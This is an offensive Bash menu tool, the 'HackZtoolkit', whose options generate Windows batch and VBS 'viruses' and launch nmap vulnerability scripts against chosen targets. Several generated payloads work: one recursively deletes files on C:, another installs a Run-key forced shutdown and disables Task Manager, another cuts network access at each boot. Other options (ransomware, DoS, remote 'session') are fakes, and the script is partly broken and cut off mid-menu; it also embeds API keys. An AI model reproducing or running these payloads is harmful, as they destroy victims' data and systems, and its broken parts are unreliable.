ENC="#color
blue="\033[33;34m"
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
purple="\033[0;35m"
cyan="\033[0;36m"
cafe="\033[0;33m"
if [[ $EUID -ne 0 ]]; then
echo -e "$red
          @@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@
      @@@@@@@@@@@@@@@@@@@@@@@@@@@
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @@@@@@@@@@@@@@@/      \@@@/   @
    @@@@@@@@@@@@@@@@\      @@  @___@
   @@@@@@@@@@@@@ @@@@@@@@@@  | \@@@@@
   @@@@@@@@@@@@@ @@@@@@@@@\__@_/@@@@@
    @@@@@@@@@@@@@@@/,/,/./'/_|.\'\,\

      @@@@@@@@@@@@@|  | | | | | | | |
                    \_|_|_|_|_|_|_|_|

$green[+]$white The HackZtoolkit - by PhChien Addams(Ph4mCh13n)
$green[+]$white Not running as root.
$green[+]$white Exiting the Hacking-Z-Toolkit  (HZT).
$green[+]$white Thank you for shopping with the HackZtoolkit.
$green[+]$white Hack the Gibson...and remember...hugs are worth more than handshakes."
exit 1
fi
function back() {
read -p "$(echo -e $green[+]$white Back In Menu ? [Y/n]: )" exit
if [ $exit = Y ]; then
sudo bash main
elif [ $exit = y ]; then
sudo bash main
elif [ $exit = N ]; then
echo -e "$green[+]$white Thanks You Use Tools <3"
echo ""
exit 1
elif [ $exit = n ]; then
echo -e "$green[+]$white Thanks You Use Tools <3"
echo ""
exit 1
else 
echo -e "$red[+]$green $exit Command Not Found "
back
fi
}
clear
echo -e "
$red
       ´´´´´´´^                      ^´´´´´´´
       ´´´´´´SS$white      Created by$red      SS´´´´´´
       ´´´´´´SS                      SS´´´´´´
       ´´´´´´´SSs$white  @HackZtoolkit$red   sSS´´´´´´´
       ´´´´´´´´SSS              SSSS´´´´´´´´
       ´´´´´´´´´³SSSS´¶¶¶¶¶¶¶¶´SSSS³´´´´´´´´´
       ´´´´´´´´´´³SSSS´¶¶¶¶¶¶´SSSS³´´´´´´´´´´
       ´´´´´´´´´¶´SSSSS´¶¶¶¶´SSSSS´¶´´´´´´´´´
       ´´´´´´´´¶¶¶´SSS´¶¶¶¶¶¶´SSS´¶¶´´´´´´´´´
       ´´´´´´´´¶¶¶¶¶´´¶¶¶¶¶¶¶¶´´¶¶¶¶´´´´´´´´´
       ´´´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´
       ´´´´´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´
       ´´´´´´´´´´¶¶´´´´¶¶¶¶´´´´´¶´´´´´´´´´´´´
       ´´´´´´´´´´¶¶´´´´¶¶¶¶´´´´´¶¶´´´´´´´´´´´
       ´´´´´´´´´´¶¶¶¶¶¶¶¶´¶¶¶¶¶¶¶¶´´´´´´´´´´´
       ´´´´´´´´´´´¶¶¶¶¶¶´´´¶¶¶¶¶¶¶´´´´´´´´´´´
       ´´´´´´´´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´´´
       ´´´´´´´´´´´´´´¶´¶´¶´¶´¶´´´´´´´´´´´´´´´
       ´´´´´´¶´´´´´´´¶´´´´´´´¶´´´´´´´¶´´´´´´´
       ´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´
       ´´´´´¶¶´´´´´´´´¶´´´´´¶´´´´´´´´¶¶´´´´´´
       ´´´´´¶¶´´´´´´´¶¶´´´´´¶¶´´´´´´´¶¶´´´´´´
       ´´´´´¶¶´¶¶´¶¶´¶´´´´´´´¶´¶¶´¶¶´¶¶´´´´´´
       ´´´¶´¶¶´¶¶´¶¶´¶´´´´´´´¶´¶¶´¶¶´¶¶´¶´´´´
       ´´¶¶´¶¶´¶¶´¶¶´¶´´´´´´´¶´¶¶´¶¶´¶¶´¶¶´´´
       ´´´¶¶¶¶´¶¶´¶¶´´´´´´´´´´´¶¶´¶¶´¶¶¶¶´´´´
       ´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´´´´¶¶´¶¶´¶¶¶´´´´
$green[::::]$white HackZtoolkit
$green[::::]$whitn VERSION : 1.8.0"
echo -e "

$green[1]$white Создать вирус, который уничтожает компьютер
$green[2]$white Создать вирус, который автоматически выключает компьютер через 1 секунд
$green[3]$white Создайте вирус, который перегружает оперативную память
$green[4]$white Создайте вирус, который блокирует доступ в Интернет навсегда
$green[5]$white Создать вирус для переформатирования жесткого диска компьютера
$green[6]$white Программы-вымогатели
$green[7]$white Вирус Android 
$green[8]$white Атака отказа в обслуживании $red(DoS Attack!!!)
$green[9]$white создать файл данных атаки на уязвимость операционной системы $red(GOD)
$green[10]$white PoC-атака $red(VIP)
$green[11]$white Hacking Website $red(VIP)
"
read -p "choose > " fl2
echo ""
if [ $fl2 = 1 ]; then
read -p "Name File : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file.bat "
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white Save to $save"
sleep 3
echo '
@echo off
#Notrayicon
echo x=msgbox("Enjoy...",0+40,"....") >>Enjoy.vbs
start "" "Enjoy.vbs"
echo>> D6F9F6G65GF958F.exe
echo >> OGV76VC7BX9BX9Y.exe
DEL C:\/s /q *.*
echo >>Treomay.vbs
set /p Treomay.vbs=
do
treomay:run
loop
start "Treomay.vbs
shutdown -s -t 30 -c "loading..." ' > $file.bat
mv $file.bat $save
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 2 ]; then
read -p "Name File : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file.bat "
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white Save to $save"
sleep 3
echo '
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v shutdown /t REG_SZ /d "shutdown.exe -f -s -t 05" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t REG_DWORD /d 1 /f
cls
copy thelove.bat "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\"
cls
taskkill /f /im explorer.exe
cls
shutdown.exe -f -s -t 01 -c "Your System Has Been Hacked By Ph4mCh13n"
cls
@echo off
echo You Has Been Hacked By Ph4mCh13n
echo GOOD BYE 
pause
del Mr.Boss.bat' > $file.bat
mv $file.bat $save
echo ""
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 3 ]; then
read -p "Name File : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file.bat "
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white Save to $save"
echo '
Set popo= Createobject("scripting.filesystemobject")
popo.copyfile wscript.scriptfullname,cuong.GetSpecialFolder(1)& "\popo.vbs"
Set popo2= CreateObject("WScript.Shell")
popo2.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersio n\Ru n","wscript.exe "&popo.GetSpecialFolder(0)& "\popo.vbs {5c76a521d424a4e61e4723f4419cc15e53e24718e589e97f7b7dfaa2c93c83f1}"
Set treomay= CreateObject("WScript.Shell")
msgbox"YOUR SYSTEM HAS BEEN ATTACK",,"HACKED"
msgbox"YOUR SYSTEM HAS BEEN LAG ON 5 SECON",,"HACKED"
msgbox"YOU ON 1 SECON",,"Danger"
msgbox"YOU ON 0 SECON",,"Danger"
msgbox"GOOD BYE",,"Danger"
Me.visible=false
App.Taskvisible=false
Do
Me.visible=false
App.Taskvisible=false
treomay.run "notepad",false
loop' > $file.bat
mv $file.bat $save
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 4 ]; then
read -p "Name File : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file.bat "
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white Save to $save"
echo '
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo You Have Been HACKED!
PAUSE' > $file.bat 
mv $file.bat $save
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 5 ]; then
read -p "Name File : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file.exe "
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white Save to $save"
echo '01001011000111110010010101010101010000011111100000' > $file.exe
mv $file.exe $save
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 6 ]; then
read -p "Attacker :" attacker
echo ""
read -p "ID Paypack , BTC  :" btc
echo ""
read -p "Name File [.rar/.exe/.zip : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file "
sleep 3
echo -e "$green[+]$white Setup Name Attacker $attacker..."
sleep 3
echo -e "$green[+]$white Setup ID BTC $btc..."
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white FIND 1 file"
sleep 3
echo -e "$green[+]$white Save to $save"
echo 'Oops , Your System Has Been Injected By ' > $file
mv $file $save
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 7 ]; then
read -p "Name File : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Created New File $file.apk "
sleep 3
echo -e "$green[+]$white Setup File..."
sleep 3
echo -e "$green[+]$white Save to $save"
echo '01001011000111110010010101010101010000011111100000' > $file.apk
mv $file.apk $save
echo -e "$green[+]$white Created Done ✓"
back
elif [ $fl2 = 8 ]; then
        function DoS() {
        read -p "$(echo Enter Target : )" url
        read -p "$(echo Enter Port : )" port
	echo "Max 100000000 Number Send "
        read -p "$(echo Enter Number Send : )" threads
     echo -e "$green[Starting Send Packet To $url:$port and $threads numbers send  "
echo " 3 "
sleep 1
echo " 2 "
sleep 1
echo " 1 "
sleep 1
echo " [!!!] ATTACKK "
sleep 0.30
a=0
b=sending
send=to
c=$url
d=$port
e=$threads

while [ $a -lt $e ]
do
        echo "[!] $b packet $a bytes by Phamchien $send $c:$d : $a "
   a=`expr $a + 1`
done
        while [ $b -lt $e ]
do
   b=`expr $b + sending`
   echo "[!] $b packet $a bytes by Phamchien $send $c:$d : $a"
done
        while [ $c -lt $e ]
do
        c=`expr $c + $send`
        echo "[!] $b packet $a bytes by Phamchien $send $c:$d : $a"
done                                                                               
       while [ $d -lt $e ]
do
        d=`expr $d + $send`
        echo "[!] $b packet $a bytes by Phamchien $send $c:$d : $a"
done
}
DoS 
back
elif [ $fl2 = 9 ]; then
read -p "Enter Clent (victim IPV4) : " clent
echo ""
read -p "Name File [.rar/.exe/.zip /.txt/.apk] : " file
echo ""
read -p "Save To :" save
echo ""
echo -e "$green[+]$white Starting Server Clent Is $clent"
sleep 3
echo -e "$green[+]$white Starting Created File..."
sleep 3
echo -e "$green[+]$white Starting Setup File..."
sleep 3
echo -e "$green[+]$white Starting Save To $save "
sleep 3
echo 'Hacked By PhamChien' > $file
mv $file $save 
scp $file root@$cleant:$save
echo -e "$green[+]$white Created Done "
read -p "Are You Sure Exploit Victim ? [Y/n] :" sure 
if [ $sure = Y ]; then
echo -e "$green[+]$white Starting Send Packet To --> $clent "
scp $file root@$cleant:$save
sleep 60
echo -e "$green[+]$white Victim Has Been Downloaded"
sleep 3
echo -e "$green[+]$white Start Sessions 1 "
sleep 5 
echo -e "$green[+]$white Sessions 1 Is Working..."
sleep 3 
function cmd() {
    read -p "$(echo -e $red[root@$cyan)$(echo -e $clent$white:~$red$)" type
    if [ $type = $type ]; then
        $type
        cmd 
        else 
            echo -e "Command Not Found $type"
                cmd
                fi 
}
cmd
elif [ $sure = y ]; then
echo -e "$green[+]$white Starting Send Packet To --> $clent "
sleep 60
echo -e "$green[+]$white Victim Has Been Downloaded"
sleep 3
echo -e "$green[+]$white Start Sessions 1 "
sleep 5 
echo -e "$green[+]$white Sessions 1 Is Working..."
sleep 3 
function cmd() {
    read -p "$(echo -e $red[root@$cyan)$(echo -e $clent$white]:~$red$)" type
    if [ $type = $type ]; then
        $type
        cmd 
        else 
            echo -e "Command Not Found $type"
                cmd
                fi 
}
cmd
elif [ $sure = n ]; then
exit 1 
elif [ $sure = N ]; then
exit 1 
else 
echo "$sure type comand not found"
exit 1 
fi
elif [ $fl2 = 11 ]; then
echo -e "
$green[ 1 ] $yellow (http-sql-injection)             $green[ 34 ]$yellow (http-phpmyadmin-dir-traversal)
$green[ 2 ] $yellow (http-wordpress-users)           $green[ 35 ]$yellow (http-phpself-xss)
$green[ 3 ] $yellow (vulners)                        $green[ 36 ]$yellow (http-slowloris-check)
$green[ 4 ] $yellow (safe)                           $green[ 37 ]$yellow (http-shellshock)
$green[ 5 ] $yellow (http-stored-xss)                $green[ 38 ]$yellow (http-trace)
$green[ 6 ] $yellow (http-dombased-xss)              $green[ 39 ]$yellow (http-vmware-path-vuln)
$green[ 7 ] $yellow (http-cookie-flags)              $green[ 40 ]$yellow (http-vuln-cve2013-6786)
$green[ 8 ] $yellow (http-dlink-backdoor)            $green[ 41 ]$yellow (DoS Attack)
$green[ 9 ] $yellow (http-enum)                      $green[ 42 ]$yellow (BIN/IIN Checker)
$green[ 10 ] $yellow (http-vuln-cve2010-2861)        $green[ 43 ]$yellow (Phone Number Checker Address)
$green[ 11 ] $yellow (http-vuln-cve2011-3192)        $green[ 44 ]$yellow (Email Checker Address)
$green[ 12 ] $yellow (http-vuln-cve2011-3368)        $green[ 45 ]$yellow (Script http-webdav-scan)
$green[ 13 ] $yellow (http-vuln-cve2006-3392)        $green[ 46 ]$yellow (Script http-iis-webdav-vuln)
$green[ 14 ] $yellow (http-vuln-cve2009-3960)        $green[ 47 ]$yellow (http-vuln-cve2014-2127)
$green[ 15 ] $yellow (broadcast-avahi-dos)           $green[ 48 ]$yellow (Options Website)
$green[ 16 ] $yellow (distcc-cve2004-2687)           $green[ 49 ]$yellow (Dump Infomations Website)
$green[ 17 ] $yellow (firewall-bypass)               $green[ 50 ]$yellow (DNS Scanning)
$green[ 18 ] $yellow (ftp-vsftpd-backdoor)           $green[ 51 ]$yellow (http-vuln-cve2014-2128)
$green[ 19 ] $yellow (ftp-vuln-cve2010-4221)         $green[ 52 ]$yellow (http-vuln-cve2014-2129)
$green[ 20 ] $yellow (ftp-proftpd-backdoor)          $green[ 53 ]$yellow (http-vuln-cve2014-8877)
$green[ 21 ] $yellow (ftp-libopie)                   $green[ 54 ]$yellow (http-vuln-cve2014-2128)
$green[ 22 ] $yellow (http-adobe-coldfusion-apsa1301)$green[ 55 ]$yellow (http-vuln-cve2014-8877)
$green[ 23 ] $yellow (http-awstatstotals-exec)       $green[ 56 ]$yellow (http-vuln-cve2015-1427)
$green[ 24 ] $yellow (http-axis2-dir-traversal)      $green[ 57 ]$yellow (http-vuln-cve2015-1635)
$green[ 25 ] $yellow (smtp-vuln-cve2011-1720)        $green[ 58 ]$yellow (http-vuln-cve2017-1001000)
$green[ 26 ] $yellow (smtp-vuln-cve2011-1764)        $green[ 59 ]$yellow (http-vuln-cve2017-5638)
$green[ 27 ] $yellow (ssl-ccs-injection)             $green[ 60 ]$yellow (http-vuln-cve2017-5689)
$green[ 28 ] $yellow (ssl-cert-intaddr)              $green[ 61 ]$yellow (http-vuln-cve2017-8917)
$green[ 29 ] $yellow (ssl-dh-params)                 $green[ 62 ]$yellow (http-vuln-misfortune-cookie)
$green[ 30 ] $yellow (ssl-heartbleed)                $green[ 63 ]$yellow (http-vuln-wnr1000-creds)
$green[ 31 ] $yellow (samba-vuln-cve-2012-1182)      $green[ 64 ]$yellow (irc-botnet-channels)
$green[ 32 ] $yellow (smb-vuln-cve-2017-7494)        $green[ 65 ]$yellow (irc-unrealircd-backdoor)
$green[ 33 ] $yellow (mysql-vuln-cve2012-2122)       $green[ 66 ]$yellow (rdp-vuln-ms12-020)
$green[ 99 ] $yellow (Back Menu)                     $green[ 67 ]$yellow (Build Camera Phishing Tools)"
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Choose Module :$nc)" mt3
if [ $mt3 = 1 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-sql-injection $tag
back
elif [ $mt3 = 2 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-wordpress-users $tag
back
elif [ $mt3 = 3 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=vulners $tag
back
elif [ $mt3 = 4 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=safe $tag
back
elif [ $mt3 = 5 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-stored-xss $tag
back
elif [ $mt3 = 6 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-dombased-xss $tag
back
elif [ $mt3 = 7 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-cookie-flags $tag
back
elif [ $mt3 = 8 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-dlink-backdoor $tag
back
elif [ $mt3 = 9 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2010-2861 $tag
back
elif [ $mt3 = 10 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2011-3192 $tag
back
elif [ $mt3 = 11 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2011-3368 $tag
back
elif [ $mt3 = 12 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2006-3392 $tag
back
elif [ $mt3 = 13 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2009-3960 $tag
back
elif [ $mt3 = 14 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-enum $tag
back
elif [ $mt3 = 15 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=broadcast-avahi-dos $tag
back
elif [ $mt3 = 16 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=distcc-cve2004-2687 $tag
back
elif [ $mt3 = 17 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=firewall-bypass $tag
back
elif [ $mt3 = 18 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=ftp-vsftpd-backdoor $tag
back
elif [ $mt3 = 19 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=ftp-vuln-cve2010-4221 $tag
back
elif [ $mt3 = 20 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=ftp-proftpd-backdoor $tag
back
elif [ $mt3 = 21 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=ftp-libopie $tag
back
elif [ $mt3 = 22 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-adobe-coldfusion-apsa1301 $tag
back
elif [ $mt3 = 23 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-awstatstotals-exec $tag
back
elif [ $mt3 = 24 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-axis2-dir-traversal $tag
back
elif [ $mt3 = 25 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=smtp-vuln-cve2011-1720 $tag
back
elif [ $mt3 = 26 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=smtp-vuln-cve2011-1764 $tag
back
elif [ $mt3 = 27 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=ssl-ccs-injection $tag
back
elif [ $mt3 = 28 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=ssl-cert-intaddr $tag
back
elif [ $mt3 = 29 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=ssl-dh-params $tag
back
elif [ $mt3 = 30 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=ssl-heartbleed $tag
back
elif [ $mt3 = 31 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=samba-vuln-cve-2012-1182 $tag
back
elif [ $mt3 = 32 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=smb-vuln-cve-2017-7494 $tag
back
elif [ $mt3 = 33 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=mysql-vuln-cve2012-2122 $tag
back
elif [ $mt3 = 34 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-phpmyadmin-dir-traversal $tag
back
elif [ $mt3 = 35 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-phpself-xss $tag
back
elif [ $mt3 = 36 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-slowloris-check $tag
back
elif [ $mt3 = 37 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-shellshock $tag
back
elif [ $mt3 = 38 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-trace $tag
back
elif [ $mt3 = 39 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vmware-path-vuln $tag
back
elif [ $mt3 = 40 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2013-6786 $tag
back
elif [ $mt3 = 41 ]; then
echo -e "$green"
java prx.java
back
elif [ $mt3 = 42 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter Num BIN :$nc) " bin
Logo2
echo -e "$green"
curl -H "Accept-Version: 3" "https://lookup.binlist.net/$bin"
back
elif [ $mt3 = 43 ]; then
Logo2
api_key=806e8db910e4a9e8f22415e0506debd0
read -p "$(echo -e $red[$green+$red]$white Enter Country Code ex TN : $nc)" co
read -p "$(echo -e $red[$green+$red]$white Enter Phone Number : $nc)" number
echo -e "$green"
curl "http://apilayer.net/api/validate?access_key=$api_key&number=$number&country_code=$co&format=1"
back
elif [ $mt3 = 44 ]; then
Logo2
api_key=bff73852e85b728070baaa0136b15916
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter Your Email : $nc )" email
echo -e "$green"
curl "http://apilayer.net/api/check?access_key=$api_key&email=$email&smtp=1&format=1"
back
elif [ $mt3 = 45 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-webdav-scan $tag
back
elif [ $mt3 = 46 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-iis-webdav-vuln $tag
back
elif [ $mt3 = 47 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2014-2127 $tag
back
elif [ $mt3 = 48 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
curl -X OPTIONS -v $tag
back
elif [ $mt3 = 49 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
whois $tag
back
elif [ $mt3 = 50 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nslookup $tag
back
elif [ $mt3 = 51 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2014-2128 $tag
back
elif [ $mt3 = 52 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2014-2129 $tag
back
elif [ $mt3 = 53 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2014-3704 $tag
back
elif [ $mt3 = 54 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2014-8877 $tag
back
elif [ $mt3 = 55 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2015-1427 $tag
back
elif [ $mt3 = 56 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2015-1635 $tag
back
elif [ $mt3 = 57 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2017-1001000 $tag
back
elif [ $mt3 = 58 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2017-5638 $tag
back
elif [ $mt3 = 59 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2017-5689 $tag
back
elif [ $mt3 = 60 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-cve2017-8917 $tag
back
elif [ $mt3 = 61 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-misfortune-cookie $tag
back
elif [ $mt3 = 62 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=http-vuln-wnr1000-creds $tag
back
elif [ $mt3 = 63 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=irc-botnet-channels $tag
back
elif [ $mt3 = 64 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=irc-unrealircd-backdoor $tag
back
elif [ $mt3 = 66 ]; then
read -p "$(echo -e $red[$green+$red]$nc) $(echo -e $white Enter The Target :$nc) " tag
echo -e "$green"
nmap -d -vv --script=rdp-vuln-ms12-020 $tag
back
fi
elif [ $fl2 = 10 ]; then
echo -e "$green[1]$white ID=42787
